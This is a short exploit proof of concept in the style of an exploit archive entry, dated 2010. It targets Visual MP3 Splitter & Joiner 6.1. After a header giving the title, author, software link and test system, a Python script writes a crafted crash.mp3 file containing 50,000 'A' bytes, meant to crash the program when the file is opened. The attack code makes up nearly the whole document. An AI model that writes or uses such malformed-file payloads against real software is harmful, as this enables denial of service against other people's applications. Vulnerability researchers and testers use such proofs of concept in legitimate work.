# Exploit Title: Visual MP3 Splitter & Joiner 6.1 (.mp3 , .wav) DoS
# Date: 9 / 8 / 2010
# Author: Oh Yaw Theng
# Software Link: http://www.maniactools.com/soft/mp3-splitter-joiner/index.shtml
# Version: 6.1
# Tested on: Windows XP SP 2
# CVE : N /A

#!/usr/bin/python

# User needs to change the following extension with the one mentioned above
filename = "crash.mp3"

junk = "\x41" * 50000

exploit = junk

textfile = open(filename,'w')
textfile.write(exploit)
textfile.close()